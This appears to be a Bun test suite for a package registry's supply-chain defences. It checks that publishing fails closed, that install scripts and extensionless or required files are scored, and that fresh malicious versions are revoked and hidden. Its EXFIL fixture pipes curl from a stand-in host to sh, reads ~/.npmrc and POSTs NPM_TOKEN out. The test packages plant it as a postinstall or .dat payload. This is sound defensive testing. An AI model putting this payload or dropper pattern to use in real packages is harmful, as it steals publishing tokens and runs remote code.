// Spec (council round 2): guards must fail closed when they cannot decide.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, getJson, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const PASSWORD = "correct-horse-battery";
const EXFIL = "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n";
let clock = Date.parse("2026-08-01T00:00:00Z");
let work: string;

async function publish(reg: Registry, token: string, spec: Parameters<typeof writePackage>[1]): Promise<{ code: number; out: string }> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, spec, reg, token);
  return run(["bun", "publish"], { cwd: d, env: sb.env });
}

beforeAll(() => {
  work = mkdtempSync(join(tmpdir(), "apm-hard-"));
});

describe("upstream unknown is not upstream absent", () => {
  let broken: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    broken = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("upstream down", { status: 503 }) });
    reg = await startRegistry({ now: () => clock, upstream: broken.url.toString() });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
    broken?.stop(true);
  });

  test("a first publish is refused while the public registry cannot be asked", async () => {
    const r = await publish(reg, alice, { name: "maybe-taken-upstream", version: "1.0.0" });
    expect(r.code).not.toBe(0);
    expect((await getJson(`${reg.url}maybe-taken-upstream`)).status).toBe(404);
  });

  test("popular names are reserved even when upstream says nothing", async () => {
    const r = await publish(reg, alice, { name: "react", version: "99.0.0" });
    expect(r.code).not.toBe(0);
    const local = await getJson(`${reg.url}-/apm/v1/packages/react`);
    expect(dig(local.body, "source")).not.toBe("local");
  });
});

describe("the score sees every file that runs", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("an install script pointing at an extensionless file is analyzed", async () => {
    const r = await publish(reg, alice, { name: "no-ext-dropper", version: "1.0.0", scripts: { postinstall: "node setup" }, files: { "index.js": "module.exports=1;\n", setup: EXFIL } });
    expect(r.code, r.out).toBe(0);
    clock += 2 * DAY;
    const s = await getJson(`${reg.url}-/apm/v1/score/no-ext-dropper/1.0.0`);
    expect(Number(dig(s.body, "score"))).toBeLessThan(40);
  });

  test("a file reached through require() is analyzed whatever its extension", async () => {
    const r = await publish(reg, alice, { name: "hidden-payload", version: "1.0.0", files: { "index.js": "module.exports = require('./lib/payload.dat');\n", "lib/payload.dat": EXFIL } });
    expect(r.code, r.out).toBe(0);
    clock += 2 * DAY;
    const s = await getJson(`${reg.url}-/apm/v1/score/hidden-payload/1.0.0`);
    expect(JSON.stringify(dig(s.body, "signals"))).toContain("credential-access");
  });
});

describe("fresh malicious versions die at once", () => {
  let reg: Registry;
  let alice: string;
  let bob: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    bob = await addUser(reg, "bob", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("revoking a version under 72h old is final even when other packages depend on it", async () => {
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.0" })).code).toBe(0);
    clock += 5 * DAY;
    expect((await publish(reg, bob, { name: "worm-dependent", version: "1.0.0", dependencies: { "worm-target": "^1.0.0" } })).code).toBe(0);
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.1" })).code).toBe(0);
    clock += 3 * 60 * 60 * 1000;
    const r = await getJson(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "worm-target", version: "1.0.1", reason: "worm", password: PASSWORD }),
    });
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    expect(dig(r.body, "status")).toBe("revoked");
    expect((await fetch(`${reg.url}worm-target/-/worm-target-1.0.1.tgz`)).status).toBe(410);
  });

  test("incident revokes fresh depended-on versions at once too", async () => {
    const t0 = clock;
    clock += 60 * 1000;
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.2" })).code).toBe(0);
    const r = await getJson(`${reg.url}-/apm/v1/incident`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ since: new Date(t0).toISOString(), reason: "phished", password: PASSWORD }),
    });
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    expect((await fetch(`${reg.url}worm-target/-/worm-target-1.0.2.tgz`)).status).toBe(410);
  });
});

describe("~safe never lets an unscored version through", () => {
  let upstream: Registry;
  let reg: Registry;
  let upTok: string;
  beforeAll(async () => {
    upstream = await startRegistry({ now: () => clock });
    upTok = await addUser(upstream, "up", PASSWORD);
    const r = await publish(upstream, upTok, { name: "fresh-evil", version: "1.0.0", scripts: { postinstall: "node i.js" }, files: { "index.js": "module.exports=1;\n", "i.js": EXFIL } });
    if (r.code !== 0) throw new Error(r.out);
    clock += 3 * DAY;
    reg = await startRegistry({ now: () => clock, upstream: upstream.url });
  });
  afterAll(async () => {
    await reg?.stop();
    await upstream?.stop();
  });

  test("the first ~safe request for a never-seen upstream package already hides its bad version", async () => {
    const { body } = await getJson(`${reg.url}~safe/fresh-evil`);
    expect(dig(body, "versions", "1.0.0")).toBeUndefined();
    const sb = makeSandbox(reg);
    const app = writeConsumer(work, reg, undefined, { "fresh-evil": "^1.0.0" });
    const r = await run(["npm", "install", "--ignore-scripts"], { cwd: app, env: { ...sb.env, npm_config_registry: `${reg.url}~safe/` } });
    expect(r.code).not.toBe(0);
  });
});
